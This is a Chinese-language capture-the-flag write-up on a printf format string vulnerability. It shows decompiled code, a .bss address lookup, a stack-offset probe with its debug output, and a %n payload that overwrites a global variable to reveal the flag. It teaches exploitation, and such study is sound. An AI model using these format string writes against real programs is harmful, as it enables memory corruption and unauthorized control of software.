在 printf 中，使用 *<a_number_of_chars>%<number>$n* 就可以将相应的第 *<number>* 个参数的位置写为 % 前输出的字符数量
1、二进制文件放入IDA中，F5出现：
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [esp+1Eh] [ebp-7Eh]
  int v5; // [esp+22h] [ebp-7Ah]
  __int16 v6; // [esp+26h] [ebp-76h]
  char s; // [esp+28h] [ebp-74h]
  unsigned int v8; // [esp+8Ch] [ebp-10h]

  v8 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf = 0;
  v5 = 0;
  v6 = 0;
  memset(&s, 0, 0x64u);
  puts("please tell me your name:");
  read(0, &buf, 0xAu);
  puts("leave your message please:");
  fgets(&s, 100, stdin);
  printf("hello %s", &buf);
  puts("your message is:");
  printf(&s);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("ank you!");
  }
  return 0;
}

这里我们需要让pwnme变成8，即可得到flag。值得注意的是printf(&s)语句没有参数，因此有明显的格式化字符串漏洞。
pwnme变量并没有出现在程序中，因此这是一个全局变量。
双击pwnme变量，找到其位置位于.bss段，即未手动初始化的数据，其地址为0x804A068:
bss:0804A064 completed_6591  db ?                    ; DATA XREF: __do_global_dtors_aux↑r
.bss:0804A064                                         ; __do_global_dtors_aux+14↑w
.bss:0804A065                 align 4
.bss:0804A068                 public pwnme
.bss:0804A068 pwnme           dd ?                    ; DATA XREF: main+105↑r
.bss:0804A068 _bss            ends
.bss:0804A068
.prgend:0804A06C ; ===========================================================================
.prgend:0804A06C
.prgend:0804A06C ; Segment type: Zero-length
.prgend:0804A06C _prgend         segment byte public '' use32
.prgend:0804A06C _end            label byte
.prgend:0804A06C _prgend         ends
.prgend:0804A06C

bss段（未手动初始化的数据）并不给该段的数据分配空间，只是记录数据所需空间的大小。
data段（已手动初始化的数据）则为数据分配空间，数据保存在目标文件中。

用pwndbg调试看一下运行栈的实际情况
输入参数，name=aaaa，message=AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
输入./CGFfsb运行程序
分别输入aaaa和AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
得到结果如下：
please tell me your name:
aaaa
leave your message please:
AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
hello aaaa
your message is:
AAAA ffca677e f7ed7580 00000001 00000000 00000001 f7f21940 61610001 000a6161 00000000 41414141 38302520 30252078
Thank you!



可以看到第11个参数是我们输入的AAAA（0x41）

同时结合前面pwnme的地址是0x0804A068

所以payload为

\x68\xa0\x04\x08+‘a’*4+%10$n


2、%n，如printf("abcdefg%n");,%n前面写了7个字符，所以向ESP（栈顶指针）所指向的地址处所指向的地址处（ESP指向了栈顶，此处存储着一个地址）写入7。
%10$n，与%n类似，不过是向[ESP + 10]处指向的内存处写入7。

目的是将pwnme改为8，所以要构造长度为8的字符串（要包含pwnme的地址，否则你怎么把%n的结果传过去？），其后跟着%?$n，这个?是字符串中pwnme地址在栈中的位置（相对ESP的偏移）。pwnme是在bss区，地址不会变动，恒为0x804A068


所以只需要找到偏移量即可。message输入：AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p

3、payload的写法：
printf格式化漏洞利用的时候，输入的内容会入栈，但是入栈的位置未知。
通过%n参数，会将%n前面输入字符的个数写入栈顶，也可通过%10$n写入栈顶偏移为10的位置。
在本题目中，需要将bss段的全局变量的值改为8，因此需要输入的个数为8个字符，此外需要将全局变量的地址输入，将8写入地址所在位置，为确定输入后地址的偏移，测试输入AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p。查看输入的地址在哪个位置。


fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。
实际上我们常用的形式是fmtstr_payload(offset,{address1:value1})
